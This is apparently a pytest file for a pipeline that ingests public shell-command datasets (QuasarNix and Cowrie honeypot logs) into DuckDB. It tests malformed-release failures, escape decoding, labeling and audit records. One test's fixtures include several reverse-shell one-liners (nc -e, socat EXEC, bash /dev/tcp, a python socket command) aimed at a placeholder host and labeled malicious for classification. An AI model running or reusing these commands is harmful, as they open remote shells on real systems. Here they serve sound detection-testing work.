"""End-to-end failure, decoding and labeling cases for public shell releases.

These use actual archive/JSON formats and the real writer; malformed records are
intentional copies used to verify that an incomplete import cannot be marked done.
Malformed honeypot records are retained in its audit output.
"""

import io
import json
import tarfile

import duckdb
import pytest
from _ingest_quasarnix import FILES
from test_ingest_batches import invoke


def quasar_release(root, positive=(), background='[]'):
    """Write all five release arrays, with an optional malformed background."""
    root.mkdir()
    for name in FILES:
        (root / name).write_text(json.dumps(list(positive)) if name == FILES[0] else '[]')
    (root / 'nl2bash.json').write_text(background)


def archive_release(root, files):
    """Create a real source archive, including directory and irrelevant members."""
    root.mkdir()
    with tarfile.open(root / 'release.tar.gz', 'w:gz') as archive:
        directory = tarfile.TarInfo('release/dataset/')
        directory.type = tarfile.DIRTYPE
        archive.addfile(directory)
        for name, rows in files.items():
            content = '\n' + ''.join(json.dumps(row) + '\n' for row in rows)
            data = content.encode()
            member = tarfile.TarInfo('release/' + name)
            member.size = len(data)
            archive.addfile(member, io.BytesIO(data))


def assert_incomplete(database):
    """A failed or explicitly bounded source must remain eligible for retry."""
    with duckdb.connect(str(database), read_only=True) as connection:
        assert connection.execute('SELECT ingested FROM INGESTED').fetchall() == [(False,)]


@pytest.mark.parametrize('dataset,module', [
    ('quasarnix', '_ingest_quasarnix'), ('shell-honeypot', '_ingest_shell_honeypot'),
])
def test_missing_public_release_fails_without_marking_complete(tmp_path, dataset, module):
    """Missing release payloads must fail with instructions to fetch them."""
    root = tmp_path / dataset
    root.mkdir()
    database = tmp_path / 'commands.duckdb'
    result = invoke(root, database, f'from {module} import records\n')
    assert result.returncode != 0 and 'fetch' in result.stderr
    assert_incomplete(database)


@pytest.mark.parametrize('content', ['{}', '["echo good", 42]', '["unterminated]'])
def test_quasarnix_malformed_array_is_not_a_complete_release(tmp_path, content):
    """Wrong JSON types and syntax must fail instead of dropping source entries."""
    root = tmp_path / 'quasarnix'
    quasar_release(root)
    (root / FILES[0]).write_text(content)
    database = tmp_path / 'commands.duckdb'
    result = invoke(root, database, 'from _ingest_quasarnix import records\n')
    assert result.returncode != 0
    assert 'expected the published array' in result.stderr or 'JSONDecodeError' in result.stderr
    assert_incomplete(database)


def test_quasarnix_background_controls_and_escape_semantics(tmp_path):
    """Recovery preserves valid JSON escapes and literal invalid escape sequences."""
    root = tmp_path / 'quasarnix'
    background = '["printf \\"quoted\\"", "printf \\u263a", "printf \\u12xz", "printf \\q", "printf \'a\tb\'"]'
    quasar_release(root, background=background)
    database = tmp_path / 'commands.duckdb'
    result = invoke(root, database, 'from _ingest_quasarnix import records\n')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database), read_only=True) as connection:
        assert connection.execute('SELECT shell_input,dataset_label FROM SHELL_INPUTS ORDER BY record_id').fetchall() == [
            ('printf "quoted"', 'benign'), ('printf ☺', 'benign'),
            ('printf \\u12xz', 'benign'), ('printf \\q', 'benign'), ("printf 'a\tb'", 'benign'),
        ], 'JSON valid escapes must decode; malformed escapes must retain their literal backslash'


def test_quasarnix_command_labels_and_bounded_reading(tmp_path):
    """Classify known reverse-shell forms while preserving unresolved padding."""
    cases = [
        ('python3 -c "print(42)"', 'benign'),
        ('python3 -c', 'malicious-group'),
        ('python3 -c "print("', 'malicious-group'),
        ('python3 -c ""', 'malicious-group'),
        ('python3 -c "print(name)"', 'malicious-group'),
        ('python3 -c "print(42, flush=True)"', 'malicious-group'),
        ('python3 -c "pass"', 'malicious-group'),
        ('sh -c "nc -e sh 10.0.0.1 4444"', 'malicious'),
        ('sh -c "echo harmless"', 'malicious-group'),
        ('rcat -r 10.0.0.1 4444', 'malicious'),
        ('nc -e /bin/sh 10.0.0.1 4444', 'malicious'),
        ('socat TCP:10.0.0.1:4444 EXEC:/bin/sh', 'malicious'),
        ('nc 10.0.0.1 4444', 'malicious-group'),
        ('python3 -c "import socket; socket.socket()"', 'malicious'),
        ('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'malicious'),
        ('bash <&5 >&5 5<>/dev/tcp/10.0.0.1/4444', 'malicious'),
        ('# no executable', None),
    ]
    root = tmp_path / 'quasarnix'
    quasar_release(root, [text for text, _ in cases])
    database = tmp_path / 'commands.duckdb'
    result = invoke(root, database, 'from _ingest_quasarnix import records\n')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database), read_only=True) as connection:
        actual = dict(connection.execute('SELECT shell_input,dataset_label FROM SHELL_INPUTS').fetchall())
        assert actual == {text: 'malicious' for text, _ in cases}, 'The source labels each submitted input, including comments, as malicious'
        process_labels = dict(connection.execute('SELECT record_id,dataset_label FROM PROCESS_LAUNCHES').fetchall())
        assert process_labels == {f'{FILES[0]}:{index}:0': label for index, (_, label) in enumerate(cases) if label is not None}, 'Parsed invocations must retain their command-specific labels'
        assert connection.execute("SELECT count(*) FROM SHELL_INPUTS WHERE (dataset_label='malicious-group') != (group_id IS NOT NULL)").fetchone() == (0,)
    bounded = tmp_path / 'bounded.duckdb'
    result = invoke(root, bounded, 'from _ingest_quasarnix import records\n', '--max-records', '1')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(bounded), read_only=True) as connection:
        assert connection.execute('SELECT shell_input FROM SHELL_INPUTS').fetchall() == [(cases[0][0],)]
    assert_incomplete(bounded)


def test_honeypot_native_sessions_positive_inputs_and_annotations(tmp_path):
    """Behavior labels ignore replay severity; explicit native IDs survive."""
    root = tmp_path / 'shell-honeypot'
    raw = [
        {'eventid': 'cowrie.session.connect', 'src_ip': '192.0.2.1', 'session': 'native-one', 'timestamp': '2024-01-01'},
        {'eventid': 'cowrie.command.input', 'src_ip': '192.0.2.1', 'input': 'id', 'timestamp': '2024-01-01T00:00:01'},
        {'eventid': 'cowrie.command.input', 'src_ip': '192.0.2.1', 'input': 'id; whoami', 'session': 'native-two'},
        {'eventid': 'cowrie.command.input', 'src_ip': '192.0.2.1', 'input': '# comment'},
        {'info': 'session.connect', 'src_ip': '192.0.2.2', 'timestamp': '2024-01-01T00:00:02'},
        {'info': 'command.input', 'src_ip': '192.0.2.2', 'tshark': "command  found [ 'uname -a']", 'timestamp': '2024-01-01T00:00:03'},
    ]
    for row in raw:
        row['protocol'] = 'ssh'
    archive_release(root, {
        'dataset/sessions/2024.jsonl': [{'session_id': 'ip-group', 'src_ip': '192.0.2.1', 'commands': ['id', 'id; whoami']}],
        '2024/cowrie/capture.jsonl': raw,
        'dataset/request_response/annotations.jsonl': [
            {'command': 'id', 'severity_vi': 2}, {'request': 'id; whoami', 'severity_vi': 1},
            {'request': 42, 'severity_vi': 1}, {'command': 'uname -a', 'severity_vi': 'unknown'},
        ],
        'ignored.txt': [{'not': 'a command source'}],
    })
    database = tmp_path / 'commands.duckdb'
    result = invoke(root, database, 'from _ingest_shell_honeypot import records\n')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database), read_only=True) as connection:
        rows = connection.execute('SELECT pgms,dataset_label,group_id,session_id,shell_input FROM SHELL_INPUTS ORDER BY record_id').fetchall()
        by_input = {row[4]: row for row in rows}
        assert by_input['id'][:3] == (['id'], 'benign', None)
        assert ':record:' in by_input['id'][3]
        assert by_input['id; whoami'][:4] == (['id', 'whoami'], 'benign', None, 'shell-honeypot:2024:deployment:native:native-two')
        assert by_input['uname -a'][:3] == (['uname'], 'benign', None)
        assert by_input['uname -a'][3].endswith('2024/cowrie/capture.jsonl:line:7')
    bounded = tmp_path / 'bounded.duckdb'
    result = invoke(root, bounded, 'from _ingest_shell_honeypot import records\n', '--max-records', '2')
    assert result.returncode == 0, result.stderr
    assert_incomplete(bounded)


def test_honeypot_unsupported_archive_is_incomplete(tmp_path):
    """Replay and derived 2024 tables alone are not observation sources."""
    root = tmp_path / 'shell-honeypot'
    archive_release(root, {'dataset/request_response/a.jsonl': []})
    database = tmp_path / 'commands.duckdb'
    result = invoke(root, database, 'from _ingest_shell_honeypot import records\n')
    assert result.returncode != 0
    assert_incomplete(database)


def test_honeypot_malformed_input_is_audited(tmp_path):
    """A bad payload is skipped while subsequent valid observations survive."""
    root = tmp_path / 'shell-honeypot'
    archive_release(root, {'2024/cowrie/a.jsonl': [
        {'eventid': 'cowrie.command.input', 'input': 42, 'protocol': 'ssh'},
        {'eventid': 'cowrie.command.input', 'input': 'id', 'protocol': 'ssh'},
    ]})
    database = tmp_path / 'commands.duckdb'
    result = invoke(root, database, 'from _ingest_shell_honeypot import records\n')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database), read_only=True) as connection:
        assert connection.execute('SELECT shell_input FROM SHELL_INPUTS').fetchall() == [('id',)]
    audit = [json.loads(line) for line in (root / 'import-audit.jsonl').read_text().splitlines()]
    assert any(row['record_id'].endswith(':line:2') for row in audit)
